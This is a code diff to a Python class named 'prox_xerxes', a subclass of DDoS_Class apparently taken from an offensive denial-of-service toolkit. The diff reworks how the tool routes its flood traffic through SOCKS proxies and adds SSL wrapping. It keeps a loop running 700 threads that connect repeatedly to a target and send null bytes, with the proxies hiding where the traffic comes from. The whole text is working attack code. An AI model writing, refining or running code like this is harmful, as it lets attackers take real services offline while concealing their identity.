@@ -9,21 +9,18 @@ class prox_xerxes(DDoS_Class):
         threads_daemon=True,
         threads=700,
         timeout=5,
-        http_list=None,
-        socks4_list=None,
-        socks5_list=None,
+        http_proxies=None,
+        socks4_proxies=None,
+        socks5_proxies=None,
         duration=60,
-        logs=False,
+        ssl_on=False,
+        logs=True,
     ):
-        self.httplist = http_list
-        if not self.httplist and self.httplist != []:
-            self.httplist = proxyscrape(timeout=scraping_timeout)
-        self.socks4list = socks4_list
-        if not self.socks4list and self.socks4list != []:
-            self.socks4list = proxyscrape(protocol='socks4',timeout=scraping_timeout)
-        self.socks5list = socks5_list
-        if not self.socks5list and self.socks5list != []:
-            self.socks5list = proxyscrape(protocol='socks5',timeout=scraping_timeout)
+        self.ssl_on=ssl_on
+        self.proxies=get_socket_proxies_from_parameters(http_proxies=http_proxies,socks4_proxies=socks4_proxies,socks5_proxies=socks5_proxies)
+        self.proxies=[x for x in self.proxies if x['proxy_type'] in ['socks4','socks5','s4','s5']]
+        if self.proxies==[]:
+            self.proxies=[{'proxy_host':None,'proxy_port':None,'proxy_username':None,'proxy_password':None,'proxy_type':None}]
         self.stop = False
         self.counter = 0
         self.start = time.time()
@@ -53,33 +50,11 @@ class prox_xerxes(DDoS_Class):
                     break
                 if self.stop == True:
                     break
+                proxy=random.choice(self.proxies)
                 try:
-                    bot_type = []
-                    if len(self.httplist) > 0:
-                        bot_type.append("h")
-                    if len(self.socks4list) > 0:
-                        bot_type.append("s4")
-                    if len(self.socks5list) > 0:
-                        bot_type.append("s5")
-                    z = random.choice(bot_type)
-                    if z == "h":
-                        line = random.choice(self.httplist)
-                    elif z == "s4":
-                        line = random.choice(self.socks4list)
-                    elif z == "s5":
-                        line = random.choice(self.socks5list)
-                    ipp = line.split(":")[0].split("=")[0]
-                    pp = line.split(":")[1].split("=")[0]
-                    s = socks.socksocket()
-                    if z == "h":
-                        s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
-                    elif z == "s4":
-                        s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
-                    elif z == "s5":
-                        s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
-                    if z == "h":
-                        s.settimeout(self.timeout)
-                    s.connect((self.target, self.port))
+                    s=get_proxy_socket(self.target,self.port,timeout=self.timeout,**proxy)
+                    if self.port==443 or self.ssl_on==True:
+                        s=wrap_socket_with_ssl(s,self.target)
                     self.counter += 1
                     while True:
                         if (
@@ -92,14 +67,14 @@ class prox_xerxes(DDoS_Class):
                             s.send("\x00".encode("utf-8"))  # send NULL character
                             if self.logs == True:
                                 sys.stdout.write(
-                                    "\r[{}: Voly sent-->{}]     ".format(x, ipp)
+                                    "\r[{}: Voly sent-->{}]     ".format(x,proxy['proxy_host'])
                                 )
                                 sys.stdout.flush()
                         except:
                             break
                         time.sleep(0.2)
                 except:
-                    pass
+                     pass
                 self.counter -= 1
                 time.sleep(0.3)
             self.kill()
